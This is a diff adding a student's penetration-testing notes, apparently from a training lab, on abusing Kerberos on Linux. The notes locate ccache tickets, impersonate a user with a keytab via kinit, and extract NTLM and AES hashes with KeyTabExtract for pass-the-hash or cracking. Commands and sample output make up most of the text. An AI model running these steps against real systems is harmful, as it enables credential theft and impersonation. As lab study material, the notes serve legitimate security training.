@@ -97,3 +97,63 @@ smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home
 
 
 ### Finding ccache Files
+- Linux machines store Kerberos tickets as ccache files in the `/tmp` directory.
+- By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.
+- `KRB5CCNAME` variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed.
+- These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets
+
+#### Reviewing Environment Variables for ccache Files.
+```powershell
+$ env | grep -i krb5
+
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+```
+
+#### Searching for ccache Files in /tmp
+```
+$ ls -la /tmp
+
+-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
+-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
+-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
+```
+
+## Abusing KeyTab Files
+- The first thing we can do is impersonate a user using `kinit`.
+- To use a keytab file, we need to know which user it was created for using `klist`
+### Listing keytab File Information
+```powershell
+$ klist -k -t 
+
+/opt/specialfiles/carlos.keytab 
+Keytab name: FILE:/opt/specialfiles/carlos.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
+```
+
+### Impersonating a User with a keytab
+Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.
+```powershell
+$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+$ smbclient //dc01/carlos -k -c ls
+```
+
+### Keytab Extract
+We can attempt to crack the account's password by extracting the hashes from the keytab file using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract). 
+```powershell
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : INLANEFREIGHT.HTB
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+```
+- With the NTLM hash, we can perform a Pass the Hash attack. 
+- With the AES256 or AES128 hash, we can forge our tickets using Rubeus PtT.
+- or attempt to crack the hashes to obtain the plaintext password.
